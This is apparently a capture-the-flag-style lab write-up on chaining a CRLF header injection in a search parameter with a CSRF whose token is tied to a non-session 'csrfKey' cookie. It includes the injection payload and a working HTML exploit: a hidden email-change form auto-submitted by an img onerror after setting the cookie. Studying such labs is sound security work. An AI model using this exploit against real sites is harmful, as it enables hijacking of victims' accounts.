# CSRF + Header injection where token is tied to non-session cookie 

In this lab, we find that the CSRF token is not linked to the session cookie, but rather to a value called `csrfKey`.

The back-end validates whether the `csrf` value matches the `csrfKey`.

![Screenshot1](/04-Screenshots/CSRF+Header-injection0.png)

In the search section, we discover that **Header Injection** can be exploited, allowing us to arbitrarily set a cookie value by adding \r\n:

`?search=test%0d%0aSet-Cookie:%20<ARBITRARY-VALUE>`

![Screenshot2](/04-Screenshots/CSRF+Header-injection1CHANGE.png)

![Screenshot3](/04-Screenshots/CSRF+Header-injection2CHANGE.png)

**Exploitation:**

Our goal is to make the victim set a `csrfKey` value that matches the CSRF token, and then perform an email change via CSRF.

- 1: make a request and save the CSRF token along with the csrfKey.
- 2: create an HTML CSRF form using the saved token.
- 3: below the form, inject a header to assign the csrfKey cookie value that matches the CSRF token.

```html
<form class="login-form" name="change-email-form" action="<IP>/my-account/change-email" method="POST">
	 <input type="hidden" type="email" name="email" value="foo@foo.com">    
	 <input type="hidden" type="email" name="csrf" value="<CSRF-VALUE>>"> 
</form>

<img src="https://<IP>/?search=test%0d%0aSet-Cookie:%20csrfKey=<CSRF_KEY-VALUE>%3b%20SameSite=None" onerror="document.forms[0].submit()">
```